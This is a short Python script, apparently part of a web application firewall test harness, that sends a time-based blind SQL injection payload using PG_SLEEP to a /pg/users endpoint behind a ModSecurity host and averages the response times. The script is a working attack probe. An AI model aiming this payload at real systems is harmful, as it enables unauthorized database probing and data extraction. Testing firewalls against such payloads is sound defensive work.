import os
import time
import urllib.parse
import urllib.request

BASE_URL = os.environ.get("ATTACK_HTTP_BASE", "http://modsecurity:8080").rstrip("/")
URL = f"{BASE_URL}/pg/users"
PAYLOAD = "1 AND 9999=(SELECT 9999 FROM PG_SLEEP(1.5))"
SAMPLES = 5
DELAY_BETWEEN = 0.5

params = urllib.parse.urlencode({"id": PAYLOAD})
full_url = f"{URL}?{params}"
samples = []

for _ in range(SAMPLES):
    start = time.time()
    try:
        with urllib.request.urlopen(full_url) as resp:
            resp.read()
    except Exception as exc:
        # capture HTTP 500 due to timeout-based behavior
        samples.append((time.time() - start) * 1000)
        print("exception:", exc)
        continue
    samples.append((time.time() - start) * 1000)
    time.sleep(DELAY_BETWEEN)

print("samples_ms=", samples)
print("avg_ms=", sum(samples) / len(samples))
